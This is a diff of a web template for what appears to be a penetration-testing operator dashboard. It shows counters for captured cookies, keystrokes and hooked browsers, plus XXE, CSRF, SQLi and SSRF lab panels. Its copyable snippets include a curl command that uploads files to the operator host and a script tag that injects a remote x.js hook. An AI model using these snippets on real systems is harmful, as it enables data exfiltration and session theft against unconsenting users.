+      <a class="btn" href="/dashboard/powershell">PowerShell</a>
+      <a class="btn" href="/dashboard/methaspx">Meth ASPX</a>
+      <a class="btn" href="/dashboard/invokeshellcode">Invoke-Shellcode</a>
+    </div>
+  </section>
+</div>
+
+<div class="grid cols-2 mt-14">
+  <section class="card">
+    <div class="card-head">
+      <h2>Operator Snippets</h2>
+    </div>
+    <div class="card-body">
+      <div class="snippet">
+        <div class="snippet-head">
+          <strong>Current host</strong>
+          <button class="btn btn-link" id="btn-edit-host" type="button">edit</button>
+        </div>
+        <pre class="code-block" id="snippet-host">{{ appdata.localhost }}</pre>
       </div>
 
+      <div class="snippet">
+        <div class="snippet-head">
+          <strong>Upload via curl </strong> <small>(Remove-item alias:curl)</small>
+          <button class="btn btn-link copy-btn" data-copy-target="snippet-upload" type="button">copy</button>
+        </div>
+        <pre class="code-block" id="snippet-upload">curl -F file=@FILENAME {{ appdata.localhost }}/upload</pre>
+      </div>
 
+      <div class="snippet">
+        <div class="snippet-head">
+          <strong>Inject x.js</strong>
+          <button class="btn btn-link copy-btn" data-copy-target="snippet-xjs" type="button">copy</button>
+        </div>
+        <pre class="code-block" id="snippet-xjs">&lt;script src="{{ appdata.localhost }}/x.js"&gt;&lt;/script&gt;</pre>
+      </div>
+    </div>
+  </section>
 
+  <section class="card">
+    <div class="card-head">
+      <h2>Web Telemetry</h2>
+      <a href="/dashboard/xxs" class="btn btn-link ml-auto fs-12">XSS Details &rarr;</a>
+    </div>
+    <div class="card-body">
+      <div class="telemetry-compact">
+        <div class="telemetry-stat">
+          <span class="telemetry-count">{{ cookies|length }}</span>
+          <span class="telemetry-label">Cookies</span>
+        </div>
+        <div class="telemetry-stat">
+          <span class="telemetry-count">{{ keylogger|length }}</span>
+          <span class="telemetry-label">Keylogger</span>
+        </div>
+        <div class="telemetry-stat">
+          <span class="telemetry-count">{{ localstorage|length }}</span>
+          <span class="telemetry-label">LocalStorage</span>
+        </div>
+        <div class="telemetry-stat">
+          <span class="telemetry-count">{{ aantalhooked }}</span>
+          <span class="telemetry-label">Hooked clients</span>
+        </div>
+      </div>
+      {% if cookies %}
+      <div class="telemetry-latest">
+        <small class="help">Laatste cookie: <a href="/dashboard/xxs/download_cookies/{{ cookies[-1].id }}">{{ cookies[-1].ip }}</a></small>
+      </div>
+      {% endif %}
+    </div>
+  </section>
+</div>
 
+<div class="grid cols-4 mt-14">
+  <section class="card">
+    <div class="card-head">
+      <h2>XXE Lab</h2>
+      <a href="/dashboard/xxe" class="btn btn-link ml-auto fs-12">Details &rarr;</a>
+    </div>
+    <div class="card-body">
+      <div class="telemetry-compact">
+        <div class="telemetry-stat">
+          <span class="telemetry-count">{{ xxe_count }}</span>
+          <span class="telemetry-label">Exfiltrations</span>
+        </div>
+      </div>
+    </div>
+  </section>
 
-      <div class="cvss-calculator">
-                            <form name="cvss-form">
-                                <div class="row">
-                                    <div class="col-md-12">
-                                        <div class="cvss-formula">
-                                            <div class="cvss-formula-title"><span>CVSSv3 Score</span></div>
-                                            <div class="cvss-formuls-body">
-                                                <textarea class="cvss-formla-value" name="cvss-formula-value" id="vectorString"></textarea>
-                                                <input type="button" value="Bereken" class="cvss-formula-reset" id="vectorStringReset" >
-                                                 <input type="button" value="Bereken" class="cvss-formula-reset" id="vectorStringReset" >
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
+  <section class="card">
+    <div class="card-head">
+      <h2>CSRF Lab</h2>
+      <a href="/dashboard/csrf" class="btn btn-link ml-auto fs-12">Details &rarr;</a>
+    </div>
+    <div class="card-body">
+      <div class="telemetry-compact">
+        <div class="telemetry-stat">
+          <span class="telemetry-count">{{ csrf_count }}</span>
+          <span class="telemetry-label">Harvested forms</span>
+        </div>
+      </div>
+    </div>
+  </section>
 
-                                        <div class="cvss-section">
-                                            <div class="cvss-section-header">
-                                                <span class="cvss-section-title" id="baseMetricGroup_Legend">Base score</span>
-                                                <span id="cvss-base-score" class="cvss-score cvss-score-medium scoreRating"><b id="baseMetricScore"></b> <span id="baseSeverity"></span></span>
-                                            </div>
-                                            <div class="cvss-section-metrics">
+  <section class="card">
+    <div class="card-head">
+      <h2>SQLi Lab</h2>
+      <a href="/dashboard/sqli" class="btn btn-link ml-auto fs-12">Details &rarr;</a>
+    </div>
+    <div class="card-body">
+      <div class="telemetry-compact">
+        <div class="telemetry-stat">
+          <span class="telemetry-count">{{ sqli_count }}</span>
+          <span class="telemetry-label">Injections</span>
+        </div>
+      </div>
+    </div>
+  </section>
 
-                                                <div class="panel panel-cvss">
-                                                    <div class="panel-heading">
-                                                        <b id="AV_Heading">Attac Vector (AV)</b>
-                                                    </div>
-                                                    <div class="panel-body">
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-n" type="radio" name="AV" id="AV_N" value="N">
-                                                            <label class="cvss-radio-label" id="AV_N_Label" for="AV_N">Network</label>
-                                                        </div>
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-a" type="radio" name="AV" id="AV_A" value="A">
-                                                            <label class="cvss-radio-label" id="AV_A_Label" for="AV_A">Adjacent</label>
-                                                        </div>
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-l" type="radio" name="AV" id="AV_L" value="L">
-                                                            <label class="cvss-radio-label" id="AV_L_Label" for="AV_L">Local</label>
-                                                        </div>
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-p" type="radio" name="AV" id="AV_P" value="P">
-                                                            <label class="cvss-radio-label" id="AV_P_Label" for="AV_P">Physic</label>
-                                                        </div>
-                                                    </div>
-                                                </div>
+  <section class="card">
+    <div class="card-head">
+      <h2>SSRF Lab</h2>
+      <a href="/dashboard/ssrf" class="btn btn-link ml-auto fs-12">Details &rarr;</a>
+    </div>
+    <div class="card-body">
+      <div class="telemetry-compact">
+        <div class="telemetry-stat">
+          <span class="telemetry-count">{{ ssrf_count }}</span>
+          <span class="telemetry-label">Redirects</span>
+        </div>
+      </div>
+    </div>
+  </section>
+</div>
 
-                                                <div class="panel panel-cvss">
-                                                    <div class="panel-heading">
-                                                        <b id="AC_Heading">Attack Complexity (AC)</b>
-                                                    </div>
-                                                    <div class="panel-body">
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-l" type="radio" name="AC" id="AC_L" value="L">
-                                                            <label class="cvss-radio-label" id="AC_L_Label" for="AC_L">Low</label>
-                                                        </div>
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-h" type="radio" name="AC" id="AC_H" value="H">
-                                                            <label class="cvss-radio-label" id="AC_H_Label" for="AC_H">High</label>
-                                                        </div>
-                                                    </div>
-                                                </div>
+<div class="grid cols-2 mt-14">
+  <section class="card">
+    <div class="card-head">
+      <h2>Findings (latest)</h2>
+    </div>
+    <div class="card-body">
+      {% if bevindingen %}
+      <table class="table compact">
+        <thead>
+          <tr>
+            <th>ID</th>
+            <th>Name</th>
+            <th>Location</th>
+            <th></th>
+          </tr>
+        </thead>
+        <tbody>
+          {% for item in bevindingen[-10:]|reverse %}
+          <tr>
+            <td>{{ item.id | nulvul }}</td>
+            <td>{{ item.naam }}</td>
+            <td>{{ item.locatie }}</td>
+            <td><a href="/dashboard/findings/edit/{{ item.id }}">edit</a></td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
+      {% else %}
+      <p class="help">No findings yet.</p>
+      {% endif %}
+    </div>
+  </section>
 
-                                                <div class="panel panel-cvss">
-                                                    <div class="panel-heading">
-                                                        <b id="PR_Heading">Privileges Required (PR)</b>
-                                                    </div>
-                                                    <div class="panel-body">
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-n" type="radio" name="PR" id="PR_N" value="N">
-                                                            <label class="cvss-radio-label" id="PR_N_Label" for="PR_N">None</label>
-                                                        </div>
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-l" type="radio" name="PR" id="PR_L" value="L">
-                                                            <label class="cvss-radio-label" id="PR_L_Label" for="PR_L">Low</label>
-                                                        </div>
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-h" type="radio" name="PR" id="PR_H" value="H">
-                                                            <label class="cvss-radio-label" id="PR_H_Label" for="PR_H">High</label>
-                                                        </div>
-                                                    </div>
-                                                </div>
+  <section class="card">
+    <div class="card-head">
+      <h2>Notes</h2>
+      <a href="/dashboard/notes" class="btn btn-link ml-auto fs-12">Alle notes</a>
+    </div>
+    <div class="card-body">
+      {% if notes %}
+      <ul class="list-plain">
+        {% for note in notes[-12:]|reverse %}
+        <li>
+          <strong><a href="/dashboard/notes/edit/{{ note.id }}">{{ note.naam }}</a></strong>
+          {% if note.uitwerken %}
+          <div class="help mt-2">{{ note.uitwerken[:120] }}{% if note.uitwerken|length > 120 %}…{% endif %}</div>
+          {% endif %}
+        </li>
+        {% endfor %}
+      </ul>
+      {% else %}
+      <p class="help">No notes available.</p>
+      {% endif %}
+    </div>
+  </section>
+</div>
 
-                                                <div class="panel panel-cvss">
-                                                    <div class="panel-heading">
-                                                        <b id="UI_Heading">User Interaction (UI)</b>
-                                                    </div>
-                                                    <div class="panel-body">
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-n" type="radio" name="UI" id="UI_N" value="N">
-                                                            <label class="cvss-radio-label" id="UI_N_Label" for="UI_N">None</label>
-                                                        </div>
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-r" type="radio" name="UI" id="UI_R" value="R">
-                                                            <label class="cvss-radio-label" id="UI_R_Label" for="UI_R">Reuired</label>
-                                                        </div>
-                                                    </div>
-                                                </div>
+<section class="card mt-14">
+  <div class="card-head">
+    <h2>Command Library</h2>
+    <a href="/dashboard/commands" class="btn btn-link ml-auto fs-12">Volledig overzicht</a>
+  </div>
+  <div class="card-body">
+    <input id="command-filter" class="form-control" type="text" placeholder="Filter commands..." />
+    <div id="command-list" class="command-list mt-10">
+      {% for cmd in commands %}
+      <details class="command-item" data-command="{{ cmd|lower }}">
+        <summary>
+          <span>{{ cmd.rsplit('/', 1)[1] }}</span>
+          <button type="button" class="btn-copy-cmd" data-content="{{ cmd | inhoudweergeven | e }}">Kopieer</button>
+        </summary>
+        <pre class="code-block">{{ cmd | inhoudweergeven }}</pre>
+      </details>
+      {% endfor %}
+    </div>
+  </div>
+</section>
 
-                                                <div class="panel panel-cvss">
-                                                    <div class="panel-heading">
-                                                        <b id="S_Heading">Scope (S)</b>
-                                                    </div>
-                                                    <div class="panel-body">
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-u" type="radio" name="S" id="S_U" value="U">
-                                                            <label class="cvss-radio-label" id="S_U_Label" for="S_U">
-                                                                Unchanged
-                                                            </label>
-                                                        </div>
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-c" type="radio" name="S" id="S_C" value="C">
-                                                            <label class="cvss-radio-label" id="S_C_Label" for="S_C">
-                                                                Changed
-                                                            </label>
-                                                        </div>
-                                                    </div>
-                                                </div>
-                                                <hr />
-                                                <div class="panel panel-cvss">
-                                                    <div class="panel-heading">
-                                                        <b id="C_Heading">Confidentality (C)</b>
-                                                    </div>
-                                                    <div class="panel-body">
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-n" type="radio" name="C" id="C_N" value="N">
-                                                            <label class="cvss-radio-label" id="C_N_Label" for="C_N">
-                                                                None
-                                                            </label>
-                                                        </div>
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-l" type="radio" name="C" id="C_L" value="L">
-                                                            <label class="cvss-radio-label" id="C_L_Label" for="C_L">
-                                                                Low
-                                                            </label>
-                                                        </div>
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-h" type="radio" name="C" id="C_H" value="H">
-                                                            <label class="cvss-radio-label" id="C_H_Label" for="C_H">
-                                                                High
-                                                            </label>
-                                                        </div>
-                                                    </div>
-                                                </div>
-
-                                                <div class="panel panel-cvss">
-                                                    <div class="panel-heading">
-                                                        <b id="I_Heading">Integrity (I)</b>
-                                                    </div>
-                                                    <div class="panel-body">
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-n" type="radio" name="I" id="I_N" value="N">
-                                                            <label class="cvss-radio-label" id="I_N_Label" for="I_N">
-                                                                None
-                                                            </label>
-                                                        </div>
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-l" type="radio" name="I" id="I_L" value="L">
-                                                            <label class="cvss-radio-label" id="I_L_Label" for="I_L">
-                                                                Low
-                                                            </label>
-                                                        </div>
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-h" type="radio" name="I" id="I_H" value="H">
-                                                            <label class="cvss-radio-label" id="I_H_Label" for="I_H">
-                                                                High
-                                                            </label>
-                                                        </div>
-                                                    </div>
-                                                </div>
-
-                                                <div class="panel panel-cvss">
-                                                    <div class="panel-heading">
-                                                        <b id="A_Heading">Availability (A)</b>
-                                                    </div>
-                                                    <div class="panel-body">
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-n" type="radio" name="A" id="A_N" value="N">
-                                                            <label class="cvss-radio-label" id="A_N_Label" for="A_N">
-                                                                None
-                                                            </label>
-                                                        </div>
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-l" type="radio" name="A" id="A_L" value="L">
-                                                            <label class="cvss-radio-label" id="A_L_Label" for="A_L">
-                                                                Low
-                                                            </label>
-                                                        </div>
-                                                        <div class="cvss-radio">
-                                                            <input class="cvss-radio-input val-h" type="radio" name="A" id="A_H" value="H">
-                                                            <label class="cvss-radio-label" id="A_H_Label" for="A_H">
-                                                                High
-                                                            </label>
-                                                        </div>
-                                                    </div>
-                          </div>
-                  </div>
-
-
-        <div class="modal-footer">
-         <button type="button" class="btn btn-danger" data-dismiss="modal">Sluiten</button>
+<div id="host-modal" class="modal-overlay d-none">
+  <div class="modal-box">
+    <div class="modal-head">
+      <h3>Edit Current Host</h3>
+      <button id="btn-host-close" class="modal-close-btn">&times;</button>
+    </div>
+    <div class="modal-body">
+      <label class="d-block mb-6 fs-13">Host URL</label>
+      <input type="text" id="host-input" class="form-control w-full" placeholder="http://10.0.0.5" />
+      <div class="settings-toggles" style="margin-top:16px;border-top:1px solid var(--border,#333);padding-top:12px">
+        <label class="d-flex gap-8 align-center fs-13" style="cursor:pointer">
+          <input type="checkbox" id="toggle-proxy" />
+          Behind Proxy (trust X-Forwarded-For)
+        </label>
+      </div>
+      <div class="mt-12 d-flex gap-8 justify-end">
+        <button id="btn-host-save" class="btn btn-primary" type="button">Save</button>
       </div>
     </div>
   </div>
 </div>
 
-
-
-
-
-
-
+<div id="scope-modal" class="modal-overlay d-none">
+  <div class="modal-box modal-md">
+    <div class="modal-head">
+      <h3>Scope Targets</h3>
+      <button id="btn-scope-close" class="modal-close-btn">&times;</button>
+    </div>
+    <div class="modal-body">
+      <div id="scope-targets-list"></div>
+      <button type="button" id="btn-add-scope-target" class="btn mt-8">+ Target toevoegen</button>
+      <div class="mt-12 d-flex gap-8 justify-end">
+        <button id="btn-scope-save" class="btn btn-primary" type="button">Opslaan</button>
+        <span id="scope-status" class="help" style="align-self:center"></span>
+      </div>
+    </div>
   </div>
 </div>
 
+{% endblock %}
 
-
-
-
-
-
-
-
-
-
+{% block scripts %}
+<script nonce="{{ csp_nonce }}" src="{{ url_for('static', filename='js/dashboard-modern.js') }}"></script>
 {% endblock %}
